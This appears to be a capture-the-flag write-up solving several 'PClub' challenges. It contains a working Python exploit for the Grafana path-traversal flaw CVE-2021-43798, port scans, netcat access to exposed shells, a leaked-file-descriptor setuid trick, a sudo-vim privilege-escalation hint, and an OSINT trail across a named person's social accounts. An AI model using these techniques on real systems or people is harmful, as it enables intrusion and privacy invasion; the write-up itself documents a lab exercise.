# OST

# Flags

PClub{Easy LFI}

PClub{4lw4ys_cl05e_y0ur_fil3s}

PClub{idk_how_this_got_typed}

PClub{hah}


# Writeup

## Blog 2

On opening the Grafana link, we first notice the version and on checking the version is old and had a CVE documented(CVE-2021-43798).

Exploit DB had a ready-made script https://www.exploit-db.com/exploits/50581.

Using the hint of temporal location, and trying /tmp/flag, we get the first flag.

```
> /tmp/flag

PClub{Easy LFI}, now onto the next one! Next challenge - 13.235.21.137:4657 and 13.235.21.137:4729

```

Python code:
```py
import requests

s = requests.Session()
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78."
}


def read(file):
    try:
        url = f"http://13.126.50.182:3000/public/plugins/alertlist/../../../../../../../../../../../../..{file}"
        req = requests.Request(method="GET", url=url, headers=headers)
        prep = req.prepare()
        prep.url = url
        r = s.send(prep, verify=False, timeout=3)

        if "Plugin file not found" in r.text:
            print("[-] File not found\n")
        else:
            if r.status_code == 200:
                print(r.text)
            else:
                print("[-] Something went wrong.")
                return
    except requests.exceptions.ConnectTimeout:
        print("[-] Request timed out. Please check your host settings.\n")
        return
    except Exception:
        pass


def main():
    try:
        read('/tmp/flag')
    except KeyboardInterrupt:
        return

if __name__ == "__main__":
    main()
```

After portscanning over the above host.

```
> nmap -sV 13.235.21.137 -p 4657,4729
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 20:43 IST
Nmap scan report for ec2-13-235-21-137.ap-south-1.compute.amazonaws.com (13.235.21.137)
Host is up (0.082s latency).

PORT     STATE SERVICE VERSION
4657/tcp open  unknown
4729/tcp open  gsmtap?
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4657-TCP:V=7.95%I=7%D=5/21%Time=682DEDB4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,33,"sh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned
SF:\x20off\r\n\$\x20")%r(GenericLines,3B,"sh:\x200:\x20can't\x20access\x20
SF:tty;\x20job\x20control\x20turned\x20off\r\n\$\x20\$\x20\$\x20\$\x20\$\x
SF:20")%r(GetRequest,52,"sh:\x200:\x20can't\x20access\x20tty;\x20job\x20co
SF:ntrol\x20turned\x20off\r\n\$\x20sh:\x201:\x20GET:\x20not\x20found\r\n\$
SF:\x20\$\x20\$\x20\$\x20")%r(HTTPOptions,56,"sh:\x200:\x20can't\x20access
SF:\x20tty;\x20job\x20control\x20turned\x20off\r\n\$\x20sh:\x201:\x20OPTIO
SF:NS:\x20not\x20found\r\n\$\x20\$\x20\$\x20\$\x20")%r(RTSPRequest,56,"sh:
SF:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x20off\r\
SF:n\$\x20sh:\x201:\x20OPTIONS:\x20not\x20found\r\n\$\x20\$\x20\$\x20\$\x2
SF:0")%r(DNSVersionBindReqTCP,33,"sh:\x200:\x20can't\x20access\x20tty;\x20
SF:job\x20control\x20turned\x20off\r\n\$\x20")%r(DNSStatusRequestTCP,33,"s
SF:h:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x20off\
SF:r\n\$\x20")%r(Help,4F,"sh:\x200:\x20can't\x20access\x20tty;\x20job\x20c
SF:ontrol\x20turned\x20off\r\n\$\x20sh:\x201:\x20HELP:\x20not\x20found\r\n
SF:\$\x20\$\x20")%r(SSLSessionReq,33,"sh:\x200:\x20can't\x20access\x20tty;
SF:\x20job\x20control\x20turned\x20off\r\n\$\x20")%r(TerminalServerCookie,
SF:33,"sh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x2
SF:0off\r\n\$\x20")%r(TLSSessionReq,33,"sh:\x200:\x20can't\x20access\x20tt
SF:y;\x20job\x20control\x20turned\x20off\r\n\$\x20")%r(Kerberos,33,"sh:\x2
SF:00:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x20off\r\n\$
SF:\x20")%r(SMBProgNeg,33,"sh:\x200:\x20can't\x20access\x20tty;\x20job\x20
SF:control\x20turned\x20off\r\n\$\x20")%r(X11Probe,33,"sh:\x200:\x20can't\
SF:x20access\x20tty;\x20job\x20control\x20turned\x20off\r\n\$\x20")%r(Four
SF:OhFourRequest,52,"sh:\x200:\x20can't\x20access\x20tty;\x20job\x20contro
SF:l\x20turned\x20off\r\n\$\x20sh:\x201:\x20GET:\x20not\x20found\r\n\$\x20
SF:\$\x20\$\x20\$\x20")%r(LPDString,51,"sh:\x200:\x20can't\x20access\x20tt
SF:y;\x20job\x20control\x20turned\x20off\r\n\$\x20sh:\x201:\x20\x01default
SF::\x20not\x20found\r\n\$\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4729-TCP:V=7.95%I=7%D=5/21%Time=682DEDB4%P=x86_64-pc-linux-gnu%r(NU
SF:LL,38,"/bin/sh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20t
SF:urned\x20off\r\n\$\x20")%r(GenericLines,40,"/bin/sh:\x200:\x20can't\x20
SF:access\x20tty;\x20job\x20control\x20turned\x20off\r\n\$\x20\$\x20\$\x20
SF:\$\x20\$\x20")%r(GetRequest,5C,"/bin/sh:\x200:\x20can't\x20access\x20tt
SF:y;\x20job\x20control\x20turned\x20off\r\n\$\x20/bin/sh:\x201:\x20GET:\x
SF:20not\x20found\r\n\$\x20\$\x20\$\x20\$\x20")%r(HTTPOptions,60,"/bin/sh:
SF:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x20off\r\
SF:n\$\x20/bin/sh:\x201:\x20OPTIONS:\x20not\x20found\r\n\$\x20\$\x20\$\x20
SF:\$\x20")%r(RTSPRequest,60,"/bin/sh:\x200:\x20can't\x20access\x20tty;\x2
SF:0job\x20control\x20turned\x20off\r\n\$\x20/bin/sh:\x201:\x20OPTIONS:\x2
SF:0not\x20found\r\n\$\x20\$\x20\$\x20\$\x20")%r(RPCCheck,C,"/bin/sh:\x200
SF::\x20")%r(DNSVersionBindReqTCP,38,"/bin/sh:\x200:\x20can't\x20access\x2
SF:0tty;\x20job\x20control\x20turned\x20off\r\n\$\x20")%r(DNSStatusRequest
SF:TCP,38,"/bin/sh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20
SF:turned\x20off\r\n\$\x20")%r(Help,59,"/bin/sh:\x200:\x20can't\x20access\
SF:x20tty;\x20job\x20control\x20turned\x20off\r\n\$\x20/bin/sh:\x201:\x20H
SF:ELP:\x20not\x20found\r\n\$\x20\$\x20")%r(SSLSessionReq,38,"/bin/sh:\x20
SF:0:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x20off\r\n\$\
SF:x20")%r(TerminalServerCookie,38,"/bin/sh:\x200:\x20can't\x20access\x20t
SF:ty;\x20job\x20control\x20turned\x20off\r\n\$\x20")%r(TLSSessionReq,38,"
SF:/bin/sh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x
SF:20off\r\n\$\x20")%r(Kerberos,38,"/bin/sh:\x200:\x20can't\x20access\x20t
SF:ty;\x20job\x20control\x20turned\x20off\r\n\$\x20")%r(SMBProgNeg,38,"/bi
SF:n/sh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\x20o
SF:ff\r\n\$\x20")%r(X11Probe,38,"/bin/sh:\x200:\x20can't\x20access\x20tty;
SF:\x20job\x20control\x20turned\x20off\r\n\$\x20")%r(FourOhFourRequest,5C,
SF:"/bin/sh:\x200:\x20can't\x20access\x20tty;\x20job\x20control\x20turned\
SF:x20off\r\n\$\x20/bin/sh:\x201:\x20GET:\x20not\x20found\r\n\$\x20\$\x20\
SF:$\x20\$\x20")%r(LPDString,5B,"/bin/sh:\x200:\x20can't\x20access\x20tty;
SF:\x20job\x20control\x20turned\x20off\r\n\$\x20/bin/sh:\x201:\x20\x01defa
SF:ult:\x20not\x20found\r\n\$\x20");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.13 seconds
```

We notice two open shells. On opening one via netcat

```sh
nc 13.235.21.137 4657
sh: 0: can't access tty; job control turned off
$ ls
file_chal  file_chal.c
$ cat file_chal.c
#include <fcntl.h>
#include <unistd.h>

int main () {
    int fd = open ("/root/flag", 0);

    // Dropping root previliges
    // definitely not forgetting anything
    setuid (getuid ());

    char* args[] = { "sh", 0 };
    execvp ("/bin/sh", args);
    return 0;
}
```

The compiled binary is likely setuid binary and keeps the file open and opens a new shell via execvp however later drops the privilegd by setting uid to GUID of process but the file was already open before having done so, so we can still access the flags with some file descriptor, 0-5 was open when checking `/proc/self/fd`, 3 fd happened to work.
```
$ ./file_chal
sh: 0: can't access tty; job control turned off
$ cat <&3
PClub{4lw4ys_cl05e_y0ur_fil3s}
```

The second challenge for blog 1 had an empty starting directory for few days, and later had 

```
$ ls -A
.swh  .swi  .swj  .swk  .swl  .swm  .swn  .swo  .swp  find_flag.pl
```

on checking the `find_flag.pl` file, we get

```pl
#!/usr/bin/perl

use strict;
use warnings;

my @swap_files = glob(".sw*");

foreach my $file (@swap_files) {
    open(my $fh, '<:raw', $file) or die "Could not open $file: $!";
    my $content = do { local $/; <$fh> };
    close($fh);

    if ($content =~ /(PClub\{[\w!-~]+\})/a) {
        print "Found flag in $file: $1\n";
        exit;
    }
}

print "Flag not found in any swap files.\n";
```

which acts as grep. After a bit of prodding around, I decided to run

```
$ sudo -l
Matching Defaults entries for ctf on 1d6089cf076a:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User ctf may run the following commands on 1d6089cf076a:
    (ALL) NOPASSWD: /bin/vim
```

implying we have a privesc. However the person before me, seems to have completely messed up the state of the problem, leading me with no further trail even after prodding around.
Later when I retried, the service was down, which I can only assume was due to someone breaking the whole setup by deleting nc, and or other stuff. Containerising the induvidual users might've been a better move by not allowing others to pull the rug under, by exploiting *the CTF*.

## Blog 1

On searching his name, we get his LinkedIn(https://www.linkedin.com/in/kalpit-lal-rama-58b789330/), from where we get his Twitter, leading to reddit account, which had a NSFW post containing.
```
12668958
29326
23627944634268
3108
8
523948
01050036027972
87177902339084610664
```

On using base36 in dcode.fr, and encrypting we get
```
HTTPS WWW INSTAGRAM COM I LIKE ANONYMITY SOMETIMES1212
```
searching the username, we get, a insta with posts having a wikipedia page vandalised https://en.wikipedia.org/w/index.php?title=Thomas_Keller_Medal&oldid=1290220257.
```
PClub{idk_how_this_got_typed}

Nice job though! Here's the next challenge : https://pastebin.com/v9vuHs52
```

which reads

```
Challenge 1 : Connect to 3.109.250.1 at port 5000
Challenge 2 : https://cybersharing.net/s/327d3991cd34b223
```

the first challenge says

```
> nc 3.109.250.1 5000

Find a string such that SHA-256 hash of "veAOuh" concatenated with your input starts with the the string "76039".
```

writing a python script to bruteforce and hoping it's small, we get

```
import hashlib, itertools, string

CLUES = [("veAOuh", "76039")]
FLAG_PREFIX, FLAG_SUFFIX = "PClub{", "}"
FLAG_CHARS = string.ascii_letters + string.digits + "_-"
MIN_LEN, MAX_LEN = 3, 18

base_s, target_p = CLUES[0]

for length in range(MIN_LEN, MAX_LEN + 1):
    print(f"Trying length: {length}")
    for content_tuple in itertools.product(FLAG_CHARS, repeat=length):
        content = "".join(content_tuple)
        candidate_flag = FLAG_PREFIX + content + FLAG_SUFFIX
        if hashlib.sha256((base_s + candidate_flag).encode()).hexdigest().startswith(target_p):
            print(f"\nFound Flag: {candidate_flag}")
            exit()
print("Flag not found.")
```


```
> pypy3 a.py
Searching for flag: PClub{content}, content length 3-18
Trying length: 3

Found Flag: PClub{hah}
```
